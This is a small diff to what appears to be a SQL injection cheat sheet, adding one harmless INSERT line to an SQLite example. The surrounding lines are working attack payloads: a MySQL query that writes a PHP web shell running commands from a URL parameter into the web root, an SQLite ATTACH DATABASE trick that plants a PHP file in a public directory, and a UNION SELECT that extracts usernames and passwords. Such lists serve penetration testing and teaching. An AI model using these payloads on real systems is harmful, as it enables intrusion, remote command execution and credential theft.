@@ -41,6 +41,7 @@ SELECT '<?php passthru($_GET[cmd])?>' INTO OUTFILE '/var/www/cmd.php'
 ```
 ATTACH DATABASE '/home/devnull/public_html/test.php' as pwn;
 	CREATE TABLE pwn.shell (code TEXT);
+INSERT INTO pwn.shell (code) VALUES ("test");
 ```
 #### Multiple Columns in a Single Column
 ' UNION SELECT username || '~' || password FROM users--
